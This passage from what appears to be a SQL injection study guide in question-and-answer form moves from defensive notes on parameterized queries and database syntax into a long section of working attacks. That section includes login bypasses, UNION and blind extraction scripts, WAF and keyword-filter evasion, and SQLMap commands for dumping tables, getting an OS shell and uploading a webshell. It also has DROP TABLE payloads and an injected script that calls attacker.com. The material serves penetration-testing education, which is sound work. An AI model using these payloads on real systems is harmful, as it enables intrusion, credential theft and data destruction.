connection.query(`SELECT * FROM users WHERE id = ${userId}`);
```

### Q24: When do parameterized queries NOT protect against SQLi?
**A:**

**Cases where prepared statements don't help:**

**1. Dynamic identifiers (table/column names):**

```python
# Can't parameterize table names
table = request.args.get('table')
cursor.execute(f"SELECT * FROM {table}")  # SQLi possible

# Even with prepared statements, you can't:
cursor.execute("SELECT * FROM ?", (table,))  # Doesn't work
```

**Fix:** Whitelist allowed values:
```python
allowed_tables = ['users', 'products', 'orders']
if table in allowed_tables:
    cursor.execute(f"SELECT * FROM {table}")  # Safe (validated)
```

**2. Dynamic ORDER BY:**

```python
sort_column = request.args.get('sort')
cursor.execute(f"SELECT * FROM users ORDER BY {sort_column}")  # SQLi
```

**Fix:** Whitelist columns:
```python
allowed_sorts = ['name', 'email', 'created_at']
if sort_column in allowed_sorts:
    cursor.execute(f"SELECT * FROM users ORDER BY {sort_column}")
```

**3. Dynamic LIMIT:**

Some databases accept:
```python
limit = request.args.get('limit')
cursor.execute(f"SELECT * FROM users LIMIT {limit}")  # Could be vulnerable
```

**Fix:**
```python
try:
    limit_int = int(limit)
    cursor.execute("SELECT * FROM users LIMIT %s", (limit_int,))
except ValueError:
    limit_int = 10  # Default
```

**4. LIKE patterns:**

```python
search = request.args.get('q')
cursor.execute("SELECT * FROM products WHERE name LIKE %s", (f"%{search}%",))
```

This is technically parameterized, but special LIKE characters can change semantics:
- `%` = match any
- `_` = match single char
- `[abc]` = char class

User can use these:
- `search = "%"` → matches all products
- Not classic SQLi, but logic bypass

**Fix:** Escape LIKE special chars:
```python
search = search.replace('%', '\\%').replace('_', '\\_')
```

**5. Stored procedures using dynamic SQL:**

```sql
CREATE PROCEDURE GetData(@table NVARCHAR(50))
AS
EXEC('SELECT * FROM ' + @table)  -- Vulnerable
```

Even passing `@table` as parameter doesn't help if procedure internally concatenates.

**6. ORMs with raw query methods:**

```python
# Django
User.objects.raw(f"SELECT * FROM users WHERE id = {user_id}")  # Vulnerable

# Safe:
User.objects.raw("SELECT * FROM users WHERE id = %s", [user_id])
```

**7. Multi-language injection (e.g., LDAP, NoSQL):**

Prepared statements specific to SQL. Other injection types (LDAP, XPath, command) need their own protection.

### Q25: What are the key differences between SQLi in MySQL, MSSQL, Oracle, PostgreSQL?
**A:**

**Concatenation:**
- MySQL: `CONCAT('a','b')` or just `'a' 'b'`
- MSSQL: `'a' + 'b'`
- Oracle: `'a' || 'b'`
- PostgreSQL: `'a' || 'b'`

**Comments:**
- MySQL: `#` or `-- ` (note: requires space after --) or `/* */`
- MSSQL: `--` or `/* */`
- Oracle: `--`
- PostgreSQL: `--` or `/* */`

**Substring:**
- MySQL: `SUBSTRING(str, pos, len)` or `SUBSTR()`
- MSSQL: `SUBSTRING(str, pos, len)`
- Oracle: `SUBSTR(str, pos, len)`
- PostgreSQL: `SUBSTRING(str FROM pos FOR len)`

**Sleep/Delay:**
- MySQL: `SLEEP(5)`
- MSSQL: `WAITFOR DELAY '0:0:5'`
- Oracle: `dbms_pipe.receive_message`
- PostgreSQL: `pg_sleep(5)`

**Version:**
- MySQL: `@@version`, `version()`
- MSSQL: `@@version`
- Oracle: `SELECT banner FROM v$version`
- PostgreSQL: `version()`

**Current user:**
- MySQL: `user()`, `current_user()`
- MSSQL: `SUSER_NAME()`, `USER_NAME()`
- Oracle: `(SELECT user FROM dual)`
- PostgreSQL: `current_user`

**Current database:**
- MySQL: `database()`
- MSSQL: `DB_NAME()`
- Oracle: `(SELECT global_name FROM global_name)`
- PostgreSQL: `current_database()`

**List databases:**
- MySQL: `SELECT schema_name FROM information_schema.schemata`
- MSSQL: `SELECT name FROM master.sys.databases`
- Oracle: N/A (uses users/schemas)
- PostgreSQL: `SELECT datname FROM pg_database`

**List tables:**
- MySQL/MSSQL/PostgreSQL: `information_schema.tables`
- Oracle: `ALL_TABLES` or `USER_TABLES`

**Stacked queries (multiple statements):**
- MySQL: Disabled in most drivers
- MSSQL: Yes
- Oracle: No
- PostgreSQL: Yes

**Conditional:**
- MySQL: `IF(condition, true_val, false_val)`
- MSSQL: `CASE WHEN... THEN... ELSE... END`
- Oracle: `DECODE(...)` or `CASE`
- PostgreSQL: `CASE WHEN... THEN... ELSE... END`

**File operations:**
- MySQL: `LOAD_FILE()`, `INTO OUTFILE`
- MSSQL: `OPENROWSET`, `xp_cmdshell` (with config)
- Oracle: `UTL_FILE` (with permissions)
- PostgreSQL: `COPY`, `pg_read_file` (superuser)

---

## SECTION B: EXPLOITATION & PAYLOADS (Q26-55)

### Q26: How do you exploit SQLi in a search functionality?
**A:**

**Vulnerable code:**
```php
$query = "SELECT * FROM products WHERE name LIKE '%" . $_GET['q'] . "%'";
```

**Step 1: Confirm SQLi**
```
Input: test'
URL: site.com/search?q=test'
Error: SQL syntax error → SQLi present
```

**Step 2: Use UNION (after determining columns)**

Search reflection helps - usually multiple columns shown.

Test column count:
```
?q=' UNION SELECT NULL --
?q=' UNION SELECT NULL, NULL --
?q=' UNION SELECT NULL, NULL, NULL --
```

Continue until no error. Note that search uses `LIKE '%...%'` so:
```
?q=' UNION SELECT 1,2,3 --
```

Need to close the LIKE quote first:
```
?q=%' UNION SELECT 1,2,3 --
```

**Step 3: Extract data**

```
?q=%' UNION SELECT username, password, NULL FROM users --
```

Returns all users in product search results.

**Step 4: Stealth approach**

Make injected results look like products:
```
?q=%' UNION SELECT username, password, 'Product fake' FROM users --
```

Now displays in product results format - less suspicious.

**Step 5: Comprehensive extraction**

```
?q=%' UNION SELECT GROUP_CONCAT(username, ':', password SEPARATOR ', '), 2, 3 FROM users --
```

All credentials in one cell.

### Q27: SQL Injection in login forms - complete attack
**A:**

**Vulnerable login query:**
```sql
SELECT * FROM users WHERE username = '$user' AND password = '$pass'
```

**Attack 1: Simple comment bypass**
```
Username: admin' --
Password: anything
```

Becomes:
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
```

Returns admin row.

**Attack 2: OR 1=1**
```
Username: ' OR '1'='1
Password: ' OR '1'='1
```

Returns all users. App uses first row = admin.

**Attack 3: Specific user**
```
Username: ' OR username='admin'--
Password: anything
```

Logs in as admin.

**Attack 4: When username/password are separate parameters**
```
Username: admin
Password: ' OR 'a'='a
```

Becomes:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' OR 'a'='a'
```

`'a'='a'` always true → bypass.

**Attack 5: When password is hashed before comparison**

If query is:
```sql
WHERE username = '$user' AND password = MD5('$pass')
```

Standard injection in username works:
```
Username: admin'--
Password: anything (hashed but not checked)
```

**Attack 6: When app checks both user count and password**

```sql
$result = mysql_query("SELECT * FROM users WHERE username = '$user' AND password = '$pass'");
$count = mysql_num_rows($result);
if ($count > 0) { login_success(); }
```

UNION attack to force a row:
```
Username: admin' UNION SELECT 'fake', 'data', 'extra' --
```

Returns fake row, count > 0, login bypassed.

**Step-by-step exploitation:**

1. Try basic payloads in Burp Suite Intruder
2. Look for response differences:
   - Different status codes
   - Different redirect locations
   - Different content
3. Successful login often:
   - 302 redirect to /dashboard
   - Sets session cookie
   - "Welcome" message

4. Once logged in:
   - Explore admin features
   - Look for additional SQLi
   - Test all parameters

### Q28: How to bypass single quote filters in SQLi?
**A:**

If application filters/escapes single quotes:

**Bypass 1: Use double quotes (some DBs)**
```sql
" OR 1=1 --
```

MySQL: Works in some configurations
MSSQL: Works
Oracle: Different behavior

**Bypass 2: Use backslash (if not properly escaped)**
```
\' OR 1=1 --
```

If escape is `'\''`, then `\'` becomes `\\''` which closes the string.

**Bypass 3: Use CHAR() function**

Build strings using character codes:
```sql
SELECT * FROM users WHERE username = CHAR(97, 100, 109, 105, 110)
-- CHAR(97,100,109,105,110) = 'admin'
```

Inject:
```
1 UNION SELECT password FROM users WHERE username = CHAR(97,100,109,105,110)
```

**Bypass 4: Use 0x hex encoding (MySQL/MSSQL)**

```sql
WHERE username = 0x61646D696E
-- 0x61646D696E = 'admin' in hex
```

**Bypass 5: Use double-encoded quotes**

```
%2527 (double URL encoded ')
%2522 (double URL encoded ")
```

If WAF decodes once, sees `%27`, doesn't recognize as quote. App decodes again, sees `'`.

**Bypass 6: Unicode equivalents**

```
%u0027 - Microsoft IIS Unicode quote
%c0%a7 - UTF-8 overlong encoding
```

**Bypass 7: No quotes needed (integer fields)**

If field is numeric, no quotes required:
```
?id=1 UNION SELECT NULL --
```

Many "quote" filters only check string contexts. Integer parameters can be injected without quotes.

**Bypass 8: Comment-based**

```
'/**/OR/**/1=1
```

Some filters check for spaces around keywords. Using comments to replace spaces bypasses.

**Bypass 9: Case manipulation**

```
' Or 1=1 --
' oR 1=1 --
```

If filter case-sensitive.

**Bypass 10: Backslash escape**

```
\ ' OR 1=1 --
```

The `\` may consume an escape, leaving `'` unescaped.

### Q29: How to bypass space/whitespace filters?
**A:**

**Common WAF/filter:** Block spaces or specific keywords with spaces.

**Bypass 1: Tabs and newlines**
```
'/**/OR/**/1=1
'%09OR%091=1     (tab = %09)
'%0AOR%0A1=1     (newline = %0A)
'%0DOR%0D1=1     (carriage return = %0D)
```

**Bypass 2: Comments as separator**
```
'/**/OR/**/1=1/**/--
'/**/UNION/**/SELECT/**/NULL,NULL--
```

**Bypass 3: Parentheses**
```
SELECT(name)FROM(users)WHERE(id=1)
'OR(1=1)--
```

**Bypass 4: Multi-line comments with content**
```
/*!50000 UNION SELECT */ NULL  -- MySQL versioned comments
```

**Bypass 5: Whitespace alternatives**

| Char | Hex |
|------|-----|
| Space | %20 |
| Tab | %09 |
| Newline | %0A |
| Carriage return | %0D |
| Form feed | %0C |
| Vertical tab | %0B |

```
'%20OR%201=1--
'%09OR%091=1--
```

**Bypass 6: Plus sign (URL encoded space)**
```
'+OR+1=1--
```

**Bypass 7: Unicode whitespace**
```
%u00a0 - Non-breaking space
%u2000 - En quad
```

### Q30: How to bypass keyword filters (SELECT, UNION, etc.)?
**A:**

**Bypass 1: Case variation**
```
SeLeCt, sElEcT, SELect
UnIoN, UnIoN sElEcT
WHERE, Where, WhEre
```

**Bypass 2: Inline comments to break keywords**
```
SE/**/LECT
UN/**/ION
WH/**/ERE
```

**Bypass 3: MySQL versioned comments**
```
/*!50000SELECT*/ - Executed only on MySQL 5.0+
/*!UNION SELECT*/
/*!50000UNION*//*!50000SELECT*/
```

WAFs may not understand these.

**Bypass 4: Hex encoding values**
```
WHERE username=0x61646d696e   (admin in hex)
```

**Bypass 5: String construction**
```
SELECT 'a''d''m''i''n'   (concatenated)
SELECT CONCAT('ad', 'min')
SELECT CHAR(97,100,109,105,110)
```

**Bypass 6: Alternative keywords**

Instead of SELECT for data extraction:
```sql
HANDLER tablename OPEN;
HANDLER tablename READ FIRST;
```

Some old MySQL features bypass keyword filters.

**Bypass 7: Stacked queries to avoid SELECT**

If SELECT blocked but stacked queries work:
```sql
1; INSERT INTO temp VALUES ((SELECT password FROM users WHERE id=1));
```

Then read temp via different endpoint.

**Bypass 8: Double encoding**
```
%2553%2545%254c%2545%2543%2554 (URL-encoded SELECT after first decode)
```

**Bypass 9: HTTP Parameter Pollution**
```
?id=1&id=2
```

WAF checks one parameter, server uses another. Different rules apply.

### Q31: How to extract data when output isn't shown (Blind)?
**A:**

**Pure Blind: Boolean-based extraction**

**Strategy:** Ask yes/no questions about the data.

**Step 1: Confirm injection point**

```
Input: 1' AND 1=1 -- → Normal response
Input: 1' AND 1=2 -- → Different response
```

**Step 2: Find length of target data**

```python
# Pseudocode
length = 0
for i in range(1, 100):
    payload = f"1' AND (SELECT LENGTH(password) FROM users WHERE username='admin')={i} --"
    if normal_response(payload):
        length = i
        break
```

**Step 3: Extract character by character**

```python
password = ""
for position in range(1, length + 1):
    for ascii_code in range(32, 127):
        char = chr(ascii_code)
        payload = f"1' AND (SELECT ASCII(SUBSTRING(password,{position},1)) FROM users WHERE username='admin')={ascii_code} --"
        if normal_response(payload):
            password += char
            print(f"Position {position}: {char}")
            break
```

**Step 4: Optimize with binary search**

Instead of trying each character (95 attempts), use binary search (~7 attempts):

```python
def get_char(position):
    low, high = 32, 127
    while low <= high:
        mid = (low + high) // 2
        payload = f"1' AND (SELECT ASCII(SUBSTRING(password,{position},1)) FROM users WHERE username='admin')>{mid} --"
        if normal_response(payload):
            low = mid + 1
        else:
            high = mid - 1
    return chr(low)
```

**Step 5: Automate with SQLMap**

```bash
sqlmap -u "http://target.com/page?id=1" --technique=B
```

SQLMap handles all the binary search automatically.

**Time-based blind extraction:**

```python
import time
import requests

def extract_char_time_based(position):
    for ascii_code in range(32, 127):
        payload = f"1' AND IF((SELECT ASCII(SUBSTRING(password,{position},1)) FROM users WHERE username='admin')={ascii_code}, SLEEP(5), 0) --"
        
        start = time.time()
        requests.get(f"http://target.com/page?id={payload}")
        elapsed = time.time() - start
        
        if elapsed > 4:  # SLEEP(5) triggered
            return chr(ascii_code)
    return '?'
```

### Q32: How does WAF detection work for SQLi?
**A:**

**Common WAF detection methods:**

**1. Signature-based:**

WAF has database of known SQLi patterns:
```
UNION SELECT
' OR 1=1
' OR '1'='1
xp_cmdshell
information_schema
sqlmap
```

If payload matches → block.

**Bypass:** Modify payload to not match signatures.

**2. Anomaly-based:**

Detect abnormal patterns:
- Multiple SQL keywords in request
- Quotes in unexpected places  
- Long parameters
- Special characters

**Bypass:** Use natural-looking payloads.

**3. Behavioral:**

Monitor traffic patterns:
- Many requests from same IP
- Increasing payload complexity (looks like fuzzing)
- Repeated 500 errors

**Bypass:** Slow, distributed testing.

**4. Machine learning:**

Trained on attack patterns. Adapts over time.

**Bypass:** Novel payloads not in training data.

**WAF identification:**

```bash
# Tool: wafw00f
wafw00f https://target.com

# Output:
# Target: target.com
# WAF detected: Cloudflare
```

**Common WAFs and known bypasses:**

**Cloudflare:**
- Sensitive to obvious payloads
- Often bypassed with case + comment combinations
```
sElEcT/*!50000*/`column`fRoM`table`
```

**AWS WAF:**
- Block common patterns
- Bypass with parameter pollution
- Use less common syntax

**ModSecurity (OWASP CRS):**
- Open source rules
- Bypass with timing attacks
- Out-of-band techniques

**Imperva:**
- Strong signature detection  
- Bypass with creative encoding

**General WAF bypass strategies:**

1. **Encoding layers**: URL, HTML, Unicode
2. **Comment tricks**: `/*!50000UNION*/`
3. **Case manipulation**: `sElEcT`
4. **Whitespace alternatives**: tabs, newlines
5. **HTTP parameter pollution**: `?id=1&id=2`
6. **Verb tampering**: GET → POST
7. **Path normalization**: `/api//users` vs `/api/users`
8. **Time-based techniques**: Avoid common detection
9. **Out-of-band**: DNS exfiltration

### Q33: How to test SQL injection in HTTP headers?
**A:**

**Vulnerable headers:**

**1. User-Agent:**
```
GET / HTTP/1.1
User-Agent: Mozilla/5.0 ' OR 1=1 --
```

If logged to database:
```sql
INSERT INTO logs (user_agent, ip, time) VALUES ('$user_agent', '$ip', NOW())
```

SQLi via stored data (second-order) or directly if used in SELECT.

**2. Referer:**
```
GET / HTTP/1.1
Referer: https://google.com'; DROP TABLE users; --
```

Some apps query DB based on Referer for analytics.

**3. X-Forwarded-For:**
```
X-Forwarded-For: 127.0.0.1' UNION SELECT password FROM users --
```

IP-based queries vulnerable.

**4. Cookie values:**
```
Cookie: session_id=abc; preferences=' OR 1=1 --
```

Some apps query DB based on cookies.

**5. Authorization:**
```
Authorization: Bearer eyJ' OR 1=1 --
```

If token used directly in SQL query.

**6. Custom headers:**
```
X-API-Key: 1' UNION SELECT NULL --
X-Tenant-ID: acme'; DROP TABLE tenants; --
```

**Testing approach:**

1. Intercept request in Burp
2. Send to Repeater
3. Modify each header with SQLi payloads
4. Look for:
   - Errors in response
   - Different content
   - Time delays
   - HTTP 500 errors

**Time-based testing in headers:**

```
X-Forwarded-For: 127.0.0.1' AND SLEEP(5) --

If response delayed → SQLi in header
```

**Burp Suite Intruder for headers:**

1. Capture request
2. Send to Intruder
3. Position §...§ around header value
4. Load SQLi payload list
5. Run attack
6. Sort by response time

### Q34: How to exploit SQLi via SQLMap effectively?
**A:**

**Basic SQLMap commands:**

```bash
# Test for SQLi
sqlmap -u "http://target.com/page?id=1"

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerate tables in specific database
sqlmap -u "http://target.com/page?id=1" -D target_db --tables

# Enumerate columns in table
sqlmap -u "http://target.com/page?id=1" -D target_db -T users --columns

# Dump table contents
sqlmap -u "http://target.com/page?id=1" -D target_db -T users --dump

# Dump all data
sqlmap -u "http://target.com/page?id=1" --dump-all
```

**With authentication:**

```bash
# Cookies
sqlmap -u "http://target.com/profile" --cookie="PHPSESSID=abc123"

# Headers
sqlmap -u "http://target.com/api" -H "Authorization: Bearer xyz"

# Specify cookie parameter to test
sqlmap -u "http://target.com/page" --cookie="user=1*" --level=2
```

**POST requests:**

```bash
# POST data
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# Test specific parameter
sqlmap -u "http://target.com/login" --data="username=admin&password=test" -p username

# From request file
sqlmap -r request.txt

# Where request.txt is:
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=test*
```

**Advanced options:**

```bash
# Increase verbosity
sqlmap -u "..." -v 3

# Specify technique
sqlmap -u "..." --technique=BUEST
# B: Boolean-based blind
# U: Union query
# E: Error-based
# S: Stacked queries
# T: Time-based

# Specify DBMS
sqlmap -u "..." --dbms=mysql

# Risk and level (1-5, 1-3)
sqlmap -u "..." --risk=3 --level=5

# Use tor for anonymity
sqlmap -u "..." --tor

# Random user agent
sqlmap -u "..." --random-agent

# Get OS shell
sqlmap -u "..." --os-shell

# Get SQL shell
sqlmap -u "..." --sql-shell

# Read file from server
sqlmap -u "..." --file-read="/etc/passwd"

# Upload file
sqlmap -u "..." --file-write="/tmp/shell.php" --file-dest="/var/www/html/shell.php"
```

**Tamper scripts (WAF bypass):**

```bash
# List available tamper scripts
sqlmap --list-tampers

# Use tamper scripts
sqlmap -u "..." --tamper=space2comment
sqlmap -u "..." --tamper=between
sqlmap -u "..." --tamper=randomcase
sqlmap -u "..." --tamper=charencode

# Chain multiple
sqlmap -u "..." --tamper=between,randomcase,space2comment
```

**Useful options:**

```bash
# Threads (faster)
sqlmap -u "..." --threads=10

# Output to file
sqlmap -u "..." -v 2 --output-dir=results/

# Resume previous session
sqlmap -u "..." --resume

# Force SSL
sqlmap -u "..." --force-ssl
```

### Q35: What are SQLMap tamper scripts and when to use them?
**A:**

**Tamper scripts** modify payloads to evade WAF/filters.

**Common tamper scripts:**

**1. space2comment**: Replace spaces with `/**/`
```
Original: UNION SELECT NULL
Tampered: UNION/**/SELECT/**/NULL
```

**2. randomcase**: Random case for keywords
```
Original: UNION SELECT
Tampered: UnIoN SeLeCt
```

**3. charencode**: URL-encode characters
```
Original: '
Tampered: %27
```

**4. between**: Replace `>` with `NOT BETWEEN 0 AND`
```
Original: 1 > 0
Tampered: 1 NOT BETWEEN 0 AND 0
```

**5. base64encode**: Base64 encode payload (rarely useful)

**6. equaltolike**: Replace `=` with `LIKE`
```
Original: id=1
Tampered: id LIKE 1
```

**7. percentage**: Add `%` before each character (ASP)
```
Original: SELECT
Tampered: %S%E%L%E%C%T
```

**8. apostrophenullencode**: Replace `'` with `%00%27`

**9. multiplespaces**: Multiple spaces around keywords

**10. unionalltounion**: Replace `UNION ALL SELECT` with `UNION SELECT`

**When to use tampers:**

```bash
# Cloudflare bypass attempts:
sqlmap -u "..." --tamper=randomcase,charencode,space2comment

# AWS WAF bypass:
sqlmap -u "..." --tamper=between,multiplespaces

# ModSecurity OWASP CRS:
sqlmap -u "..." --tamper=apostrophenullencode,charunicodeencode

# Try multiple WAFs:
sqlmap -u "..." --tamper=randomcase,charencode,space2comment,between
```

**Creating custom tamper:**

```python
# my_tamper.py
def tamper(payload, **kwargs):
    if payload:
        # Custom modification
        payload = payload.replace(' ', '/*custom*/')
        return payload

# Use it:
sqlmap -u "..." --tamper=./my_tamper.py
```

### Q36: How to test SQLi in JSON request bodies?
**A:**

**Setup:** Modern APIs often use JSON.

**Vulnerable code:**
```python
@app.route('/api/users', methods=['POST'])
def search_users():
    data = request.json
    name = data['name']
    query = f"SELECT * FROM users WHERE name = '{name}'"
    return execute(query)
```

**Attack request:**
```http
POST /api/users HTTP/1.1
Content-Type: application/json

{
  "name": "admin' OR '1'='1"
}
```

**Burp Suite approach:**

1. Capture JSON request
2. Send to Repeater
3. Modify JSON values:
```json
{
  "name": "admin' UNION SELECT password FROM users--"
}
```

**SQLMap with JSON:**

Create request file:
```http
POST /api/users HTTP/1.1
Host: target.com
Content-Type: application/json

{"name": "test*", "id": 1}
```

`*` marks injection point. Use:
```bash
sqlmap -r request.txt
```

**Or specify parameter:**
```bash
sqlmap -u "http://target.com/api/users" \
  --method=POST \
  --headers="Content-Type: application/json" \
  --data='{"name":"test","id":1}' \
  -p name
```

**Common JSON injection points:**

```json
// String values
{"name": "<INJECT>"}

// Numeric values
{"id": <INJECT>}

// Array values
{"ids": [<INJECT>]}

// Nested
{"user": {"id": <INJECT>}}

// Filter parameters
{"filter": {"username": "<INJECT>"}}
```

### Q37: How to test SQLi in GraphQL queries?
**A:**

**GraphQL backend often uses SQL.** Injection possible in:
- Query parameters
- Mutation inputs
- Filter arguments

**Example vulnerable resolver:**
```javascript
const resolvers = {
  Query: {
    user: (parent, args) => {
      // VULNERABLE
      const query = `SELECT * FROM users WHERE id = ${args.id}`;
      return db.query(query);
    }
  }
};
```

**Attack via GraphQL:**

```graphql
{
  user(id: "1 UNION SELECT username, password, NULL FROM users--") {
    id
    name
  }
}
```

**Filter injections:**

```graphql
{
  users(filter: {name: "admin' OR '1'='1"}) {
    id
    name
    email
  }
}
```

**Where clauses:**

```graphql
{
  products(where: "1=1; DROP TABLE products;--") {
    id
  }
}
```

**Testing approach:**

1. **Find GraphQL endpoint:**
   - `/graphql`, `/api/graphql`, `/query`

2. **Use introspection (if enabled):**
   ```graphql
   {
     __schema {
       types { name fields { name } }
     }
   }
   ```

3. **Identify input arguments:**
   - Test each argument
   - Both string and integer types

4. **Manual SQLi testing:**
   - Try basic payloads
   - Look for errors in response

5. **Automated tools:**
   - **InQL** (Burp extension)
   - **GraphQLmap**
   - SQLMap with GraphQL query

**Time-based via GraphQL:**

```graphql
{
  user(id: "1' AND SLEEP(5)--") {
    id
  }
}
```

If response takes 5+ seconds → SQLi confirmed.

### Q38: SQL Injection via XML inputs (XXE-style)?
**A:**

**Vulnerable XML parsing into SQL:**

```php
$xml = simplexml_load_string($_POST['xml']);
$query = "SELECT * FROM users WHERE id = " . $xml->user_id;
```

**Attack XML:**

```xml
<?xml version="1.0"?>
<request>
  <user_id>1 UNION SELECT username, password FROM users--</user_id>
</request>
```

**Combined XXE + SQLi:**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe "1 UNION SELECT username, password FROM users--">
]>
<request>
  <user_id>&xxe;</user_id>
</request>
```

**SOAP API SQLi:**

```xml
<soap:Envelope xmlns:soap="...">
  <soap:Body>
    <GetUser>
      <userId>1' OR '1'='1</userId>
    </GetUser>
  </soap:Body>
</soap:Envelope>
```

**Testing:**

1. Find XML/SOAP endpoint
2. Modify each element value
3. Test for SQL errors or behavioral changes
4. Use Burp's "SOAP Hello World" projects or wsdler

### Q39: SQL Injection in cookies
**A:**

**Vulnerable code:**
```php
$preferences = $_COOKIE['user_preferences'];
$query = "SELECT theme FROM preferences WHERE setting = '$preferences'";
```

**Attack:**
```
Cookie: user_preferences=default' UNION SELECT password FROM users--
```

**Testing approach:**

1. Identify cookies used in DB queries:
   - User preferences
   - Tracking cookies
   - Authentication cookies
   - Custom cookies

2. **Manual modification in Burp:**
   - Repeater tab
   - Modify cookie value
   - Add SQLi payload

3. **SQLMap with cookies:**
```bash
sqlmap -u "http://target.com" \
  --cookie="user=1*; tracking=abc" \
  --level=2
```

Level 2+ tests cookies.

**Stealing data via cookies:**

```
Cookie: pref=' UNION SELECT GROUP_CONCAT(username,':',password) FROM users--
```

Often cookies less scrutinized than POST/GET parameters - common vulnerability.

### Q40: How does encoding affect SQLi exploitation?
**A:**

**Different encodings for SQLi:**

**1. URL encoding (most common):**

```
Original: ' OR 1=1--
URL encoded: %27%20OR%201%3D1--

Double encoded: %2527%2520OR%25201%253D1--
```

**2. HTML entity encoding (rare for SQLi):**

```
Original: '
HTML: &#39; or &apos;
```

**3. Base64 encoding (some applications):**

If app decodes Base64 first:
```
Payload: ' OR 1=1--
Base64: JyBPUiAxPTEtLQ==
Send: JyBPUiAxPTEtLQ%3D%3D
```

**4. Hex encoding (MySQL specific):**

```sql
-- 'admin' = 0x61646d696e
WHERE username = 0x61646d696e
```

Useful when quotes filtered.

**5. Unicode/UTF-8:**

```
%c0%a7 = ' (UTF-8 overlong)
%u0027 = ' (IIS Unicode)
```

Used for WAF bypass.

**Why encoding matters:**

**Application:**
- Decodes input
- Passes to SQL query
- If WAF before decode → bypasses signature

**WAF:**
- Should normalize before checking
- Some don't handle all encodings
- Double encoding often bypasses

**Testing strategy:**

1. Try plain payload first
2. URL encode
3. Double URL encode
4. Hex encode
5. Try database-specific encoding

### Q41: SQL injection via second-order through file uploads
**A:**

**Scenario:** Application processes uploaded file metadata.

**Vulnerable code:**
```php
// Process uploaded file
$filename = $_FILES['file']['name'];
$query = "INSERT INTO uploads (filename, user_id) VALUES ('$filename', $user_id)";
```

**Attack:**

Upload file named:
```
test', (SELECT password FROM users WHERE id=1), 1)--.jpg
```

Query becomes:
```sql
INSERT INTO uploads (filename, user_id) VALUES ('test', (SELECT password FROM users WHERE id=1), 1)--.jpg', 5)
```

User_id field now contains admin password!

**Then read via:**
```
GET /api/uploads/list
Response: [{"filename": "test...", "user_id": "extracted_password"}]
```

**Or vulnerable second query:**

```php
$user_files = $db->query("SELECT * FROM uploads WHERE filename = '$searched_filename'");
```

When admin searches uploads, the malicious filename triggers injection.

**File upload SQLi locations:**

1. **Filename**: Most common
2. **MIME type**: If logged
3. **EXIF data**: If extracted to DB
4. **File contents** (CSV/Excel imports):
   - Cell values directly inserted
   - No sanitization
5. **File path**: User-controlled paths

**Testing:**

1. Upload files with SQLi payloads in names
2. Check application's handling
3. Look for behavioral changes
4. Check if data appears elsewhere

### Q42: How to test SQL injection in import features (CSV, Excel)?
**A:**

**Common vulnerability:** Apps that import CSV/Excel often have SQLi.

**Vulnerable code:**
```python
import csv
with open(uploaded_file) as f:
    reader = csv.reader(f)
    for row in reader:
        name, email = row[0], row[1]
        # VULNERABLE
        query = f"INSERT INTO users (name, email) VALUES ('{name}', '{email}')"
        execute(query)
```

**Attack CSV:**

```csv
name,email
"test","attacker@evil.com"
"admin', 'admin@admin.com'); DROP TABLE users; --","ignore"
```

When processed:
```sql
INSERT INTO users (name, email) VALUES ('admin', 'admin@admin.com'); DROP TABLE users; --', 'ignore')
```

Drops table!

**Excel/CSV injection variants:**

**1. SQLi in cell values:**
```csv
name,quantity
"Product1",100' OR '1'='1
```

**2. CSV formula injection (different but related):**
```csv
=HYPERLINK("https://attacker.com/?data="&A1, "Click")
=SUM(A1:B10) + IMPORTXML(...)
```

These don't inject SQL but execute Excel formulas (sensitive if file viewed in Excel).

**3. Numeric field SQLi:**
```csv
name,price
"Test",1 UNION SELECT password FROM users
```

**Testing approach:**

1. Find import features
2. Create malicious CSV with various payloads
3. Upload and observe:
   - Database modifications
   - Error messages
   - Application behavior
4. Test both string and numeric columns

**Real-world example:**

Many ERPs, CRMs have vulnerable CSV import. Massive impact when found.

### Q43: SQL Injection in ORM frameworks - common patterns
**A:**

**ORMs help but don't eliminate SQLi:**

**Django ORM safe:**
```python
# Safe - parameterized
User.objects.filter(name=user_input)

# Safe - explicit parameterization
User.objects.raw("SELECT * FROM users WHERE name = %s", [user_input])
```

**Django ORM vulnerable:**
```python
# Vulnerable - format string in raw query
User.objects.raw(f"SELECT * FROM users WHERE name = '{user_input}'")

# Vulnerable - extra() method with concatenation
User.objects.extra(where=[f"name = '{user_input}'"])

# Vulnerable - annotate with raw SQL
User.objects.annotate(custom=RawSQL(f"SELECT {user_input} FROM table"))
```

**SQLAlchemy safe:**
```python
# Safe
session.query(User).filter(User.name == user_input)

# Safe parameterized raw
session.execute(text("SELECT * FROM users WHERE name = :name"), {"name": user_input})
```

**SQLAlchemy vulnerable:**
```python
# Vulnerable
session.execute(text(f"SELECT * FROM users WHERE name = '{user_input}'"))

# Vulnerable - filter with text concatenation
session.query(User).filter(text(f"name = '{user_input}'"))
```

**Hibernate (Java) safe:**
```java
// Safe
Query query = session.createQuery("FROM User WHERE name = :name");
query.setParameter("name", userInput);
```

**Hibernate vulnerable:**
```java
// Vulnerable
Query query = session.createQuery("FROM User WHERE name = '" + userInput + "'");

// Vulnerable - native query
session.createNativeQuery("SELECT * FROM users WHERE name = '" + userInput + "'");
```

**Sequelize (Node.js) safe:**
```javascript
// Safe
User.findOne({ where: { name: userInput } });
```

**Sequelize vulnerable:**
```javascript
// Vulnerable
sequelize.query(`SELECT * FROM users WHERE name = '${userInput}'`);

// Vulnerable - using literal
User.findOne({ where: literal(`name = '${userInput}'`) });
```

**Testing approach:**

1. Identify ORM usage
2. Look for raw query methods
3. Check for string concatenation
4. Test injection points

### Q44: How to chain SQLi with other vulnerabilities?
**A:**

**Chain 1: SQLi → File Upload → RCE**

1. SQLi to read database credentials
2. Use credentials to access admin panel
3. Admin panel has file upload
4. Upload webshell
5. RCE

**Chain 2: SQLi → SSRF**

```sql
1 UNION SELECT LOAD_FILE('/etc/passwd')--
```

MySQL LOAD_FILE can access network paths:
```sql
1 UNION SELECT LOAD_FILE('http://internal-service/admin')--
```

Now SSRF via SQLi.

**Chain 3: SQLi → Stored XSS**

```sql
1; UPDATE users SET bio = '<script>fetch("//attacker.com")</script>' WHERE id != 0
```

Modify all bios with XSS. Anyone viewing user profiles gets XSSed.

